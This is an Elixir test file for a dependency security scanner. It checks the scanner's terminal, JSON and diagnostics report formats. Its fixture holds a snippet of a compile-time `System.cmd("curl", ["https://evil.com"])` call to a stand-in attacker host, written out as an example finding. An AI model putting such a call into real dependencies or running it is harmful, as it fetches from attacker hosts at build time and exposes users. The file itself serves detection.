defmodule VetCli.E2E.OutputFormatTest do
  use ExUnit.Case, async: true

  import ExUnit.CaptureIO

  alias VetCore.Types.{ScanReport, DependencyReport, Dependency, Finding}

  setup do
    report = %ScanReport{
      project_path: "/tmp/format_test_project",
      timestamp: DateTime.utc_now(),
      dependency_reports: [
        %DependencyReport{
          dependency: %Dependency{name: :risky_dep, version: "0.1.0", source: :hex},
          findings: [
            %Finding{
              dep_name: :risky_dep,
              file_path: "/tmp/format_test_project/deps/risky_dep/lib/risky.ex",
              line: 3,
              column: 5,
              check_id: :system_exec,
              category: :system_exec,
              severity: :critical,
              compile_time?: true,
              snippet: ~s|@cmd System.cmd("curl", ["https://evil.com"])|,
              description: "Call to System.cmd/2,3 — executes an external system command"
            },
            %Finding{
              dep_name: :risky_dep,
              file_path: "/tmp/format_test_project/deps/risky_dep/lib/risky.ex",
              line: 7,
              column: 5,
              check_id: :env_access,
              category: :env_access,
              severity: :warning,
              compile_time?: false,
              snippet: ~s|System.get_env("HOME")|,
              description: ~s|Call to System.get_env("HOME") — reads an environment variable|
            }
          ],
          risk_score: 55,
          risk_level: :high
        },
        %DependencyReport{
          dependency: %Dependency{name: :safe_dep, version: "2.0.0", source: :hex},
          findings: [],
          risk_score: 0,
          risk_level: :low
        }
      ],
      summary: %{
        total_deps: 2,
        total_findings: 2,
        deps_by_risk_level: %{high: 1, low: 1},
        highest_risk_dep: :risky_dep,
        highest_risk_score: 55,
        critical_count: 0,
        high_count: 1
      }
    }

    %{report: report}
  end

  describe "terminal output structure" do
    test "contains header, summary, and ANSI codes", %{report: report} do
      output = capture_io(fn -> VetReporter.Terminal.render(report) end)

      # Header
      assert output =~ "Vet \u2014 Dependency Security Scan"

      # Summary section
      assert output =~ "Summary"
      assert output =~ "Dependencies scanned: 2"
      assert output =~ "Total findings:       2"

      # ANSI escape sequences should be present
      assert output =~ "\e["
    end

    test "shows dependency names and scores", %{report: report} do
      output = capture_io(fn -> VetReporter.Terminal.render(report) end)

      assert output =~ "risky_dep"
      assert output =~ "safe_dep"
      assert output =~ "55"
    end

    test "shows finding details with severity", %{report: report} do
      output = capture_io(fn -> VetReporter.Terminal.render(report) end)

      assert output =~ "CRITICAL"
      assert output =~ "WARNING"
      assert output =~ "COMPILE-TIME"
      assert output =~ "System.cmd"
    end
  end

  describe "JSON output structure" do
    test "has required top-level keys", %{report: report} do
      json_string = VetReporter.Json.encode(report)
      {:ok, parsed} = Jason.decode(json_string)

      assert Map.has_key?(parsed, "project_path")
      assert Map.has_key?(parsed, "timestamp")
      assert Map.has_key?(parsed, "summary")
      assert Map.has_key?(parsed, "dependencies")
    end

    test "timestamp is ISO8601 format", %{report: report} do
      json_string = VetReporter.Json.encode(report)
      {:ok, parsed} = Jason.decode(json_string)

      # ISO8601 timestamps contain T separator and Z or offset
      assert parsed["timestamp"] =~ ~r/\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}/
    end

    test "each dependency has required fields", %{report: report} do
      json_string = VetReporter.Json.encode(report)
      {:ok, parsed} = Jason.decode(json_string)

      for dep <- parsed["dependencies"] do
        assert Map.has_key?(dep, "name")
        assert Map.has_key?(dep, "version")
        assert Map.has_key?(dep, "risk_score")
        assert Map.has_key?(dep, "risk_level")
        assert Map.has_key?(dep, "findings")
      end
    end

    test "each finding has required fields", %{report: report} do
      json_string = VetReporter.Json.encode(report)
      {:ok, parsed} = Jason.decode(json_string)

      risky = Enum.find(parsed["dependencies"], fn d -> d["name"] == "risky_dep" end)
      assert length(risky["findings"]) == 2

      for finding <- risky["findings"] do
        assert Map.has_key?(finding, "check_id")
        assert Map.has_key?(finding, "category")
        assert Map.has_key?(finding, "severity")
        assert Map.has_key?(finding, "compile_time")
        assert Map.has_key?(finding, "file_path")
        assert Map.has_key?(finding, "line")
        assert Map.has_key?(finding, "description")
      end
    end
  end

  describe "diagnostics output" do
    test "contains file paths and line numbers in diagnostic format", %{report: report} do
      output = capture_io(fn -> VetReporter.Diagnostics.render(report) end)

      # Diagnostics format: file:line: severity: [vet:check_id] description
      assert output =~ "risky.ex:3"
      assert output =~ "risky.ex:7"
      assert output =~ "error:"
      assert output =~ "warning:"
      assert output =~ "[vet:system_exec]"
      assert output =~ "[vet:env_access]"
    end
  end
end
